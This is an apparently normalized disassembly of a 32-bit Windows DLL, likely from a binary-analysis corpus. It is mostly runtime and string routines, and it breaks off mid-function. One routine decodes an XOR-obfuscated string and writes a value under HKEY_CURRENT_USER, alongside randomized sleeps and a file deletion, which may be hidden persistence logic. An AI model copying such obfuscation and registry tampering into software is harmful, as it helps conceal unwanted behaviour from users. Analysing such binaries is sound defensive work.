test esi esi
jne r-xdata
call sub_10056990
cmp eax edi
je r-xdata
call sub_1001a7d0
xor ecx ecx
mov [ ebp - 0x70 ] 0x7
mov [ ebp - 0x74 ] edi
mov [ ebp - 0x84 ] cx
mov [ ebp - 0x4 ] edi
mov edx [ ebp - 0x2e0 ]
mov edi [ ebp - 0x2dc ]
push edx
push edi
mov ecx rw-data
mov esi rw-data
call sub_100105c0
test eax eax
je r-xdata
lea eax [ ebp - 0x2e4 ]
push eax
mov [ ebp - 0x2e4 ] 0x0
call sub_1000b569
mov eax [ ebp - 0x2e4 ]
jmp r-xdata
push 0x2710
call [ Sleep@IAT ]
jmp r-xdata
cmp ebx 0x2
jne r-xdata
lea eax [ ebp - 0x2dc ]
call sub_10068940
jmp r-xdata
mov ecx eax
call sub_100471e0
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov esi [ rw-data ]
xor edx edx
sub esi ecx
div esi
add esp 0x4
add edx ecx
imul edx edx 0x3e8
push edx
call [ Sleep@IAT ]
jmp r-xdata
push edi
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ rw-data ]
push r--data
xor edi edi
mov ecx rw-data
call sub_1005e510
test eax eax
je r-xdata
mov [ rw-data ] esi
cmp [ rw-data ] 0x8
mov eax [ rw-data ]
jae r-xdata
push eax
call [ DeleteFileW@IAT ]
push 0x0
push r--data
mov ecx rw-data
call sub_1005e3c0
mov eax rw-data
sub_100407f0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
push esi
mov esi [ eax ]
mov [ edx + 0x8 ] esi
mov esi [ eax ]
cmp [ esi + 0x15 ] 0x0
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
pop esi
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
mov [ ecx + 0x8 ] eax
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
mov [ ecx ] eax
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
sub_10040843
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
js r-xdata
call sub_10012991
mov [ eax ] 0x9
call sub_1003c242
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_100408c4
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
add ecx 0x2
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub_100408f0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push 0xffffffff
mov esi ecx
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov [ esi ] 0x0
call sub_100146b0
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1004091b
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
pop ecx
sub_1004093d
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp edi 0x3fffffff
jbe r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
lea eax [ edi + edi ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
or eax 0xffffffff
jmp r-xdata
pop esi
cmp eax ebx
jl r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi * 2 - 0x2 ] ax
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_100036b3
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_100036b3
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_10040a40
push ecx
push ebx
push edi
xor edi edi
mov ebx ecx
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
push eax
mov edx ebx
mov ecx esi
mov [ esi + 0x54 ] edi
call sub_100270f0
mov [ esi + 0x4 ] edi
cmp [ ebx + 0x84 ] 0x8
jb r-xdata
add ebx 0x70
mov ebx [ ebx + 0x70 ]
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x14 ] eax
call sub_10078600
add esp 0xc
pop edi
mov eax esi
pop ebx
pop ecx
retn
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
sub_10040ad0
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_1005ac7e
xor edx edx
add esp 0x4
cmp eax edx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
call sub_10052185
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_1002050e
int3
mov ecx [ esi + 0x4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x8 ] ecx
lea ecx [ eax + 0xc ]
mov [ eax + 0x14 ] dx
cmp ecx edx
je r-xdata
mov esp ebp
pop ebp
retn
mov edx [ edi ]
mov [ ecx ] edx
mov edx [ edi + 0x4 ]
mov [ ecx + 0x4 ] edx
sub_10040b35
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10037f49
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_10040bd2
push 0x28
mov eax sub_1007e4e0
call sub_10050d0f
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10040c60
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0xc4
push edi
call sub_10024af0
mov esi eax
mov [ edi + 0x8 ] esi
xor ebx ebx
mov [ esi ] ebx
lea ecx [ esi + 0x10 ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0x70 ] 0x96
mov eax [ r--data ]
push ecx
push edi
mov [ esi + 0xc ] eax
call sub_1001c570
lea edx [ esi + 0x20 ]
push edx
push edi
mov [ esi + 0x1c ] ebx
call sub_1001c570
mov eax [ ebp + 0xc ]
lea ecx [ esi + 0x94 ]
push ecx
mov [ ebp + 0x8 ] ecx
mov ecx [ ebp + 0x10 ]
push ecx
push eax
push edi
mov [ esi + 0x2c ] eax
call sub_10055a50
mov edx [ ebp + 0x8 ]
add esi 0x30
push esi
push edx
call sub_10061790
mov eax [ edi + 0x8 ]
add esp 0x30
pop edi
pop esi
mov [ eax + 0x7c ] ebx
mov [ eax + 0x80 ] ebx
mov [ eax + 0x84 ] ebx
mov [ eax + 0x88 ] ebx
mov [ eax + 0x8c ] ebx
mov [ eax + 0x90 ] ebx
pop ebx
pop ebp
retn
sub_10040cfd
push 0x28
mov eax sub_1007e4e0
call sub_10050d0f
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10040d90
push ebp
mov ebp esp
sub esp 0xf0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff87
and edx 0xff
mov [ ebp + eax * 2 - 0x8c ] dx
inc eax
cmp eax 0x29
jb r-xdata
push edi
mov edi [ RegOpenKeyExW@IAT ]
lea ecx [ ebp - 0xe4 ]
push ecx
push 0x1
xor eax eax
push eax
lea edx [ ebp - 0x8c ]
push edx
push 0x80000001
mov [ ebp - 0x3a ] ax
call edi
test eax eax
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0x109
mov [ ebp - 0xf0 ] 0x4
mov [ ebp - 0xe8 ] 0x0
call sub_1001bb80
lea eax [ ebp - 0xf0 ]
push eax
mov eax [ ebp - 0xe4 ]
lea ecx [ ebp - 0xe8 ]
push ecx
push 0x0
push 0x0
push edx
push eax
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xe4 ]
push esi
mov esi [ RegCloseKey@IAT ]
push edx
call esi
lea edx [ ebp - 0xe0 ]
mov eax 0x27
call sub_1001bb80
lea eax [ ebp - 0xe4 ]
push eax
push 0x2
push 0x0
mov ecx edx
push ecx
push 0x80000001
call edi
test eax eax
je r-xdata
mov eax [ ebp - 0xe8 ]
cmp eax 0x1
je r-xdata
mov ecx [ ebp - 0xe4 ]
push 0x4
lea edx [ ebp - 0xec ]
push edx
push 0x4
push 0x0
lea eax [ ebp - 0x38 ]
push eax
push ecx
mov [ ebp - 0xec ] 0x1
call [ RegSetValueExW@IAT ]
test eax eax
je r-xdata
pop esi
mov eax 0x2
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xe4 ]
push ecx
call [ RegCloseKey@IAT ]
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0xe4 ]
push eax
call esi
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
xor eax eax
pop edi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xe4 ]
push edx
call esi
pop esi
mov eax 0x3
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10040f33
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002bb9f
add esp 0x1c
pop ebp
retn
sub_10040f60
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
cmp eax ecx
jae r-xdata
mov ebx [ ebp + 0x10 ]
sub eax ecx
cmp eax ebx
jae r-xdata
push r--data
call sub_1003b4a6
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_100616c6
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_100616c6
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1004d5e0
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x10
cmp [ edx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
mov ecx edx
mov ecx [ edx ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] eax
jb r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
add ecx [ ebp + 0xc ]
push ebx
push ecx
mov ecx [ esi + 0x10 ]
add ecx eax
push ecx
call sub_10078600
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10041070
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fdd1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x14 ] esi
lea esp [ esp ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0x24
add edi 0x24
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
mov [ ebp + 0x8 ] edi
jmp r-xdata
push 0xffffffff
push ebx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push edi
mov ecx esi
mov [ esi ] ax
call sub_1001c310
mov ecx [ edi + 0x1c ]
mov [ esi + 0x1c ] ecx
mov edx [ edi + 0x20 ]
mov edi [ ebp + 0x8 ]
mov [ esi + 0x20 ] edx
cmp edi [ ebp + 0xc ]
je r-xdata
sub_100410fd
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_1002050e
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_10016390
add esi 0x24
cmp esi edi
jne r-xdata
sub_10041130
mov eax esi
push edi
lea edi [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax edi
sar eax 0x1
mov edi eax
mov eax [ ecx + 0x10 ]
push esi
call sub_1005e510
neg eax
sbb eax eax
inc eax
pop edi
retn
sub_10041157
mov edi edi
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x24c ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x23c ] eax
call sub_10054678
call sub_10012991
mov [ ebp - 0x26c ] eax
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_1001742d
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x248 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
xor esi esi
mov [ ebp - 0x240 ] ebx
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x240 ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x274 ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x274 ]
mov edi [ ebp - 0x21c ]
mov dl al
jmp r-xdata
sub_10041d5f
push 0x34
mov eax sub_1007e6a6
call sub_10007703
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x14 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x40 ] eax
mov al [ ebx ]
test al al
je r-xdata
xor esi esi
push esi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] 0x0
call sub_1004b830
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x3c ] 0xfffffffe
mov [ ebp - 0x34 ] 0x1
mov cl al
mov edx ebx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1001c5c0
mov eax [ ebp - 0x3c ]
call sub_10019c00
retn
mov al [ edi + ebx ]
test al al
je r-xdata
inc edx
mov cl [ edx ]
test cl cl
jne r-xdata
inc [ ebp + 0x10 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov cl [ ebx ]
cmp cl al
jne r-xdata
cmp [ eax + esi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
inc edi
mov al [ edi + ebx ]
test al al
jne r-xdata
add edi [ ebp - 0x34 ]
mov al [ edi + ebx ]
cmp al [ ebx ]
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp al cl
je r-xdata
push 0x7f
pop ecx
cmp [ ebp - 0x34 ] ecx
jae r-xdata
test al al
je r-xdata
movsx eax [ eax + esi ]
add edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x34 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_100161f2
test al al
jne r-xdata
inc esi
cmp esi [ ebp + 0x10 ]
jb r-xdata
mov [ ebp - 0x3c ] esi
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x34 ]
cmp ecx 0x7f
jb r-xdata
mov ecx [ ebp - 0x38 ]
cmp [ ecx + 0x4 ] al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push 0x7f
pop ecx
mov al [ edi + ebx ]
cmp al [ ecx + 0x5 ]
jne r-xdata
call sub_1004cd62
mov ecx [ ebp - 0x38 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_100161f2
test al al
jne r-xdata
mov [ eax + esi ] cl
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x38 ]
inc [ ebp - 0x34 ]
call sub_10017b01
or [ ebp - 0x3c ] 0xffffffff
jmp r-xdata
xor esi esi
xor edi edi
mov [ ebp - 0x2d ] 0x0
cmp [ ebp + 0x10 ] esi
jbe r-xdata
sub_10041ec4
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0x8 ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100582b2
add esp 0x10
test eax eax
jns r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x18 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_10041f10
push esi
mov esi ecx
test [ esi + 0x40 ] 0x1
mov [ esi ] r--data
je r-xdata
mov edx [ esi + 0x10 ]
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x14 ]
mov [ edx ] 0x0
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x0
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] 0x0
mov ecx esi
pop esi
jmp sub_1005b460
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
push ecx
call sub_10065045
add esp 0x4
sub_10041f76
mov edi edi
push esi
push 0x18
mov esi ecx
call sub_1005ac7e
push eax
mov [ esi ] eax
call sub_1004c551
pop ecx
pop ecx
mov eax esi
pop esi
retn
sub_10041fb0
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
mov ecx [ rw-data ]
fld [ r--data ]
fsubr st1
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fld [ r--data ]
fcom st1
fnstsw ax
fstp st1
test ah 0x41
jne r-xdata
fld st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fldz
fstp [ ecx + 0x118 ]
pop ebp
retn 0x4
fld st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fld [ r--data ]
fstp [ ecx + 0x118 ]
pop ebp
retn 0x4
fxch st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcompp
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fld1
fstp [ ecx + 0x118 ]
pop ebp
retn 0x4
pop ebp
retn 0x4
fld [ r--data ]
fstp [ ecx + 0x118 ]
sub_10042084
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0xc ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10041d5f
add esp 0x10
test eax eax
jns r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_100420d4
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
jmp r-xdata
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi [ ebp + 0x14 ]
jne r-xdata
xor eax eax
cmp edx [ ebp + 0xc ]
setne al
movzx eax [ edx ]
movzx ecx [ esi ]
cmp cx ax
ja r-xdata
or eax 0xffffffff
jmp r-xdata
jb r-xdata
pop esi
pop ebp
retn
xor eax eax
inc eax
jmp r-xdata
add edx 0x2
add esi 0x2
sub_10042119
push 0x58
mov eax sub_1007e2ff
call sub_10007703
mov eax [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
push eax
